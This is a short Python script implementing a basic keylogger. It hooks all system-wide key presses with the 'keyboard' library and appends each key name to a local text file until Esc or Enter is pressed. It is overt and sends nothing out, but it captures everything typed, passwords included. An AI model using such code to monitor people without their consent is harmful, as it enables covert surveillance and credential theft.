import keyboard
import threading

class KeyLogger:
    def __init__(self):
        self.typed_text = ""
        self.exit_flag = threading.Event()

    def key_listener(self):
        print("Esc to exit.")

        keyboard.hook(self.key_event)

        self.exit_flag.wait()

        keyboard.unhook_all()

    def key_event(self, event):
        if event.event_type == keyboard.KEY_DOWN:
            if event.name == 'esc':
                self.exit_flag.set()
            else:
                self.log_text(event.name)

    def log_text(self, key):
        with open("keyboard_log.txt", "a") as file:
            file.write(key + " ")

if __name__ == "__main__":
    key_logger = KeyLogger()
    key_listener_thread = threading.Thread(target=key_logger.key_listener)

    key_listener_thread.start()

    try:
        # Your main program or activities here
        input("Press 'Enter' to stop logging and exit...")

    except KeyboardInterrupt:
        pass
    finally:
        key_logger.exit_flag.set()
        key_listener_thread.join()
